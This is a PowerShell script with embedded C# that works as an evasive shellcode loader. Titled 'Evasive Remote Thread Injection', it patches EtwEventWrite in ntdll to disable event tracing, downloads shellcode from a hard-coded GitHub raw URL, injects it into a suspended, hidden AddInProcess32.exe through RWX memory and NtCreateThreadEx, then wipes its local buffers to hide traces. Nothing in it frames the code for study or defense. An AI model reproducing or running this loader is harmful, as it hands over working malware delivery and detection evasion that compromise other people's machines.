#Requires -Version 3.0
<#
    Evasive Remote Thread Injection — Rebuilt v2
    All logic in C#, PowerShell just kicks it off
#>

 $code = @"
using System;
using System.Runtime.InteropServices;
using System.Reflection;

public class GhostLoader
{
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        int StackZeroBits,
        int SizeOfStack,
        int MaximumStackSize,
        IntPtr AttributeList);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(
        IntPtr lpAddress,
        UIntPtr dwSize,
        uint flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    static void Log(string msg)
    {
        string ts = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.ffff");
        Console.ForegroundColor = ConsoleColor.Cyan;
        Console.WriteLine("[" + ts + "] :: " + msg);
        Console.ResetColor();
    }

    public static string DisableDefenses()
    {
        try
        {
            IntPtr lib = LoadLibrary("nt" + "dll");
            IntPtr addr = GetProcAddress(lib, "Et" + "wEv" + "ent" + "Wr" + "ite");
            uint old;
            VirtualProtect(addr, (UIntPtr)1, 0x40, out old);
            Marshal.WriteByte(addr, 0xC3);
            return "OK";
        }
        catch (Exception ex)
        {
            return "Failed: " + ex.Message;
        }
    }

    public static string Execute(string url)
    {
        try
        {
            // Phase 1: Patch ETW
            Log("Patching EtwEventWrite in ntdll...");
            string defenseResult = DisableDefenses();
            if (defenseResult != "OK")
            {
                return "ETW patch failed: " + defenseResult;
            }
            Log("ETW patched -> EtwEventWrite returns immediately");

            // Phase 2: Fetch shellcode
            Log("Retrieving shellcode from " + url + "...");
            byte[] payload;
            using (var client = new System.Net.WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                client.Proxy = System.Net.WebRequest.GetSystemWebProxy();
                client.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                payload = client.DownloadData(url);
            }
            Log("Shellcode received: " + payload.Length + " bytes");
            byte[] heapBuffer = payload;

            // Phase 3: Spawn sacrificial process (suspended)
            string targetPath = System.Environment.GetEnvironmentVariable("windir")
                + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";
            Log("Spawning sacrificial process: " + targetPath);

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.dwFlags = 1;
            si.wShowWindow = 0;
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            IntPtr createResult = CreateProcess(
                null,
                targetPath,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4 | 0x8000000,    // CREATE_SUSPENDED | CREATE_NO_WINDOW
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (createResult == IntPtr.Zero)
            {
                int err = Marshal.GetLastWin32Error();
                return "CreateProcess failed (LastError: " + err + ")";
            }
            Log("Process spawned (suspended) -> PID: " + pi.dwProcessId);

            // Phase 4: Map shellcode into remote RWX
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr size = (IntPtr)heapBuffer.Length;

            Log("Allocating RWX in remote process...");
            uint status = NtAllocateVirtualMemory(
                pi.hProcess,
                ref baseAddress,
                IntPtr.Zero,
                ref size,
                0x3000,    // MEM_COMMIT | MEM_RESERVE
                0x40);     // PAGE_EXECUTE_READWRITE

            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return "NtAllocateVirtualMemory failed: 0x" + status.ToString("X8");
            }
            Log("Remote RWX allocated at 0x" + baseAddress.ToString("X"));

            Log("Writing shellcode into remote buffer...");
            uint bytesWritten;
            status = NtWriteVirtualMemory(
                pi.hProcess,
                baseAddress,
                heapBuffer,
                (uint)heapBuffer.Length,
                out bytesWritten);

            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return "NtWriteVirtualMemory failed: 0x" + status.ToString("X8");
            }
            Log("Shellcode written: " + bytesWritten + " bytes at 0x" + baseAddress.ToString("X"));

            // Phase 5: Execute via NtCreateThreadEx
            Log("Creating remote thread at 0x" + baseAddress.ToString("X") + "...");
            IntPtr threadHandle;
            status = NtCreateThreadEx(
                out threadHandle,
                0x1FFFFF,       // THREAD_ALL_ACCESS
                IntPtr.Zero,
                pi.hProcess,
                baseAddress,
                IntPtr.Zero,
                false,          // CreateSuspended = false
                0, 0, 0,
                IntPtr.Zero);

            if (status != 0)
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return "NtCreateThreadEx failed: 0x" + status.ToString("X8");
            }
            Log("Remote thread created and running");

            // Phase 6: Cleanup & erase
            Log("Closing handles...");
            CloseHandle(threadHandle);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Log("Zeroing local shellcode buffer...");
            for (int i = 0; i < heapBuffer.Length; i++)
            {
                heapBuffer[i] = 0;
            }
            heapBuffer = null;
            payload = null;

            Log("Forcing garbage collection...");
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            Log("Local footprint erased. Injection complete.");
            return "SUCCESS";
        }
        catch (Exception ex)
        {
            return "Exception: " + ex.Message + "\n" + ex.StackTrace;
        }
    }
}
"@

Write-Host "[*] Compiling injection engine..." -ForegroundColor Yellow
try {
    Add-Type $code
    Write-Host "[+] Engine compiled" -ForegroundColor Green
} catch {
    Write-Host "[-] Compilation failed: $_" -ForegroundColor Red
    exit
}

Write-Host "[*] Executing..." -ForegroundColor Yellow
 $result = [GhostLoader]::Execute('https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin')

Write-Host ""
if ($result -eq "SUCCESS") {
    Write-Host "████████████████████████████████████" -ForegroundColor Green
    Write-Host "█  INJECTION SUCCESSFUL!          █" -ForegroundColor Green
    Write-Host "█  Process kept alive (suspended) █" -ForegroundColor Green
    Write-Host "█  Shellcode thread running       █" -ForegroundColor Green
    Write-Host "████████████████████████████████████" -ForegroundColor Green
} else {
    Write-Host "[-] FAILED: $result" -ForegroundColor Red
}
Write-Host ""